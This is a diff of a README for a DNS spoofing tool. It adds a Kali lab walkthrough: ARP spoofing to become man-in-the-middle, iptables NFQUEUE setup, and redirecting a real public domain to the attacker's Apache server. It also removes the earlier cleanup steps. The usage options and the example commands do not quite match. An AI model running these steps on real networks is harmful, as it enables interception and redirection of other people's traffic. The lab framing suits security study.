@@ -3,9 +3,11 @@
 ## Requirements
 
 * Python 2 or 3
-* [NetFilterQueue](https://github.com/oremanj/python-netfilterqueue#installation)
-* An iptables `NFQUEUE` (`FORWARD` chain if comes from another device, `OUTPUT` and `INPUT` chain when testing on hacking machine)
-* Scapy
+* Scapy and netfilter modules
+* Domain to be spoofed
+* IP address webserver to redirect to
+
+## Usage
 
 ```shell
 $ sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
@@ -24,33 +26,45 @@ $ sudo iptables -I INPUT -j NFQUEUE --queue-num 0
 usage: dns_spoofer.py [-h] [-d DOMAIN] [-r IP]
 ```
 
-### Example use
+### Kicking the tyres
 
-Go in the middle:
+Choose a domain to spoof and check it is reachable:
 
 ```shell
-$ sudo sysctl -w net.ipv4.ip_forward=1
-$ sudo python3 arp_spoofer.py -t 192.168.122.75 -s 192.168.122.1
+@kali:~$ ping -c 1 sqa.fyicenter.com
+PING sqa.fyicenter.com (74.208.236.35) 56(84) bytes of data.
+64 bytes from 74-208-236-35.elastic-ssl.ui-r.com (74.208.236.35): icmp_seq=1 ttl=52 time=131 ms
+
+--- sqa.fyicenter.com ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 131.125/131.125/131.125/0.000 ms
+
 ```
 
-Set up queue and intercept:
+Become MitM by running the [arp_spoofer](/arp_spoofer)
 
 ```shell
-$ sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
-$ sudo python3 dns_spoofer.py                      
+@kali:~$ sudo python3 arp_spoofer.py
+[sudo] password for <user>: 
+[+] Setting forward
+[+] Packets sent: 63
 ```
 
-View queue with
+Run DNS spoofer:
 
 ```shell
-$ sudo cat /proc/net/netfilter/nfnetlink_queue
+@kali:~$ sudo python3 dns_spoofer.py -q forward
+[+] Starting apache2 service...
+              
 ```
 
-Afterwards, do not forget to disable net.ipv4.ip_forward and to remove the created iptables `NFQUEUE`:
+On Windows testlab machine, visit http://sqa.fyicenter.com in browser and check that the Kali apache server comes up instead.
 
 ```shell
-$ sudo sysctl -w net.ipv4.ip_forward=0
-$ sudo iptables --flush
+@kali:~$ sudo python3 dns_spoofer.py
+[+] Starting apache2 service...
+[+] Spoofing Target
+                   
 ```
 
 ## Troubleshooting
